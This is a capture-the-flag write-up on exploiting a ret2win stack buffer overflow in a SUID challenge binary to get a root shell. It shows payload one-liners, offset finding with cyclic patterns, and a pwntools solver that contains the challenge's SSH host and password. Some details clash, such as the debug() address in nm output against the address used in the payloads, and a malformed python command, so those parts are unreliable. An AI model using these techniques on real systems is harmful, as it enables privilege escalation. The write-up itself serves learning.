# Checking binary type & protections

My idea was to first download it and work on it locally. As we access the target through SSH we need to use `scp` to download the files  

```bash
➜  baby_pwn git:(main) ✗ scp -P 10020 baby@tcp0.infra.ctf.grehack.fr:/home/baby/baby .
➜  baby_pwn git:(main) ✗ scp -P 10020 baby@tcp0.infra.ctf.grehack.fr:/home/baby/baby.c .
➜  baby_pwn git:(main) ✗ ls -l
total 32
-rwxrwxr-x 1 kali kali 19264 Nov 16 16:56 baby
-rw-r--r-- 1 kali kali  4717 Nov 16 16:56 baby.c
```  

I couldn't interact with the binary locally: had a `file not found` error, so i switched to interact with it directly from the target machine (i could launch `checksec` and `file` on it locally tho).  

```bash

*props for the ASCII art^^*

So we know it's a ret2win type challenge: there's a function `debug()`, which isn't called by main() or anywhere else ... and we need to find a way to call it so we can get a nice root shell.

`baby` has a SUID *(thats the `s` you can see just below)* which means that whoever runs the binary, will run it as root. So if we get the shell, we'll get a root shell *(more details on this at the bottom of the article)*.  

```bash
0773290cf797:~$ ls -l baby
-rwxsrwxr-x 1 baby baby 19264 Nov 16 16:56 baby
```  

# The plan
The goal is to overwrite the buffer, overflowing into memory enough so we can reach the saved EBP (the one pushed on the stack right before `slogan()` is called , and write there the address of `debug()`.  
Like this, when `debug()` is fully executed, the program, which was supposed to point to an addres in `main()` so it could return to it,  will instead point to `debug()` and call it. The function will be executed, and we have our root shell.

# Finding the offset
First we need to find how many characters we need to inject in order to reach the return address. After few trials i found out the number is 22. You can't see it here but i was running the payload (containing As and four Bs) from inside GDB and when i had all four Bs inside EIP at the time of crash, i knew i had found the offset (this number can sometimes vary when sending the payload from 'outside' of the binary).   

# Getting the `debug()` function address  
We can do it from 'outside' or 'inside' the binary. Let's do it from the outside:  

```bash
0773290cf797:~$ nm baby | grep debug
08048205 T debug
```  

> OK we have the number of chars we need to write, our address, so lets get into it.<br> 

# Getting a shell
I tried combinations of perl, python and bash commands to inject my payload into `baby` but none worked

```bash
0773290cf797:~$ python --version
Python 3.12.3
0773290cf797:~$ python -c 'print(b"A" * 22' + b"\x05\x92\x04\x08")' | ./baby
0773290cf797:~$ perl -e 'print "A" x 22 . "\x05\x92\x04\x08"' | ./baby
0773290cf797:~$ echo -e 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08' | ./baby
```  
*you don't see it here but they all caused the program to crash without even printing anything from `debug()`*   


> A friend later advised me to add `0x0a` to the `echo -e` command in order to add a new line char and maybe avoid the crash (0x0a = new line char in hexa)*  

`printf()` printed me something from `debug()` so i chose to stick to it  

```bash
0773290cf797:~$ printf 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08\n' | ./baby
Fill this : New is not always ...?
...

AAAAAAAAAAAAAAAAAAAAAA ? The good one is the following one :
New is not always better ! But sometimes, it is ;)
Debug mode enabled
... segfault blablabla
```
*the program was crashing, but at least i got something more!*  

Now the idea is that the `stdin` (standard input) remains **open** so we can throw in a `cat flag.txt` and read the flag.
In Unix-like systems, `stdin` is the input **stream** that a process reads from. So as long as our `baby` binary reads this 'stream', anything that goes in it (like `cat flag.txt`) will be read by `baby` and displayed in our terminal.  
We do this by **enclosing** the payload with a `cat` command and pipe this into the binary. 
TL;DR: the program will be blocked from terminating before we can even throw in some commands.

## How does this works ?  
Using `()` with commands inside will create a subshell in which those commands will be executed, let's try it:  

```bash
0773290cf797:~$ (printf 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08'; cat)

AAAAAAAAAAAAAAAAAAAAAA�

^C
0773290cf797:~$
```  

As you can see, i had to manually cut the execution using CTRL+C otherwise the content is just being `cat`ted (not an official term, please don't kill me...) indefinitely ...
So it's kinda like a tunnel is being created, and one way to exit it is by using CTRL+C.  

Good so now we have this tunnel, lets pipe it into the binary. This will allow us to be able to `cat` indefinitely, thats useless here but at least long enough to cat our `flag.txt` and get our flag. 


```bash
0773290cf797:~$ (printf 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08\n'; cat) | ./baby
                                                                          .=****-

Why are we getting a root shell ? Well, `debug()` being the one giving us that, let's analyse it.  

```c
void debug(){
    setreuid(geteuid(), geteuid());
    printf("Debug mode enabled\n");
    system("/bin/ash");
}
```  

### setruid
From the man pages we see that `setreuid` takes two parameters: `ruid` and `euid`.  

```bash
0773290cf797:~$ man setreuid
...
int setreuid(uid_t ruid, uid_t euid);
...
setreuid() sets real and effective user IDs of the calling process.
``` 

- `real user ID` (ruid) = the user who owns the process aka the user who started the process.  
- `effective user ID` (euid) = the ID the process uses for permission checks.  

- `setreuid(getieuid(), geteuid())` will therefore sets both IDs to whatever `getuid()` returns both times.  
- `geteuid` will return the effective user ID of the calling process. 

The binary being run as `root`, when we call a shell from one of its function, so 'inside' it, `geteuid()` will both times return `0` which is the `root` user ID. `setreuid()` will therefore also returns `0` and poof, we get a root shell.

## Why my Python payload didn't work  

This line was causing a crash   

```bash
0773290cf797:~$ python -c 'print(b"A" * 22' + b"\x05\x92\x04\x08")' | ./baby
```  
The target machine was running on Python3  

```bash
0773290cf797:~$ python --version
Python 3.12.3
```  

So why does this crash ? Looks legit right ? The reason is (thanks Nishacid): in Python3 *(as opposed to Python2)*, `print()` displays **unicode** on stdout, which means we have extra octets being added to our payload. See yo on the bottom of the post to see how to circumvent that.  


# Two other ways to solve it and another way to find the offset

After talking to some friends and also nishacid (the challenge creator), i've been given a lot of very useful tips on how to solve the challenge differently. I knew some of the methods, but as what follows has been given to me, i'm giving back credits.  

## Solving with SSH & Pwntools 

I didnt even try this method because i couldn't launch the binary, but a friend who could did it, and gave me his solver. I've commented the code to help you better understand it.

```python
from pwn import *

# establishing SSH connection to remote server
socket = ssh(host='tcp0.infra.ctf.grehack.fr', user='baby', password='luV8GgeNzLmi8uERa7', port=10020)

# loads the baby binary (located on the remote server not locally) and create en 'object' we can interact with
p = socket.process('./baby')

# receiving and prints initial output from the program
print(p.recv())

# payload crafting (22*A + debug() address)
payload = b"A" * 22 + p32(0x08049205)

# sending the payload
p.sendline(payload)

# opening an interactive shell to interact with the remote program
p.interactive()
```  

## Solving locally with Python3
So this payload was causing `baby` to crash

```bash
0773290cf797:~$ python -c 'print(b"A" * 22' + b"\x05\x92\x04\x08")' | ./baby
``` 

And this one not
```bash
0773290cf797:~$ (python -c 'import sys;sys.stdout.buffer.write(b"a"*22+b"\x05\x92\x04\x08")' && cat) | ./baby
```  
And that's because `buffer.write()` ensures that the payload is written as **raw** bytes, so **without** unintended encoding or formatting issues ... which means no extra added octets => we send what we see, and it works :)  

As you maybe have seen, you can use `(b"a"*22+b"\x05\x92\x04\x08")' && cat)` or `(b"a"*22+b"\x05\x92\x04\x08")'; cat)`.

## Another way to find the offset (locally)  

Let's use pwntools to create a payload

```bash
0773290cf797:~$ python -c 'from pwn import *; print(cyclic(200).decode())'
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```  
*I don't have to specify python3 here as python is what's associated to python3*  

Let's crash the program

```bash
Fill this : New is not always ...?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab ? The good one is the following one :
New is not always better ! But sometimes, it is ;)
Program received signal SIGSEGV, Segmentation fault.
0x61676161 in ?? ()
(gdb)
```  

Let's find the offset: the program crashes with the value `0x61676161` pointed to by EIP ... lets find where this value is.

```bash
0773290cf797:~$ python -c 'from pwn import *; print(cyclic_find(0x61676161))'
22
```  

Offset is still 22.
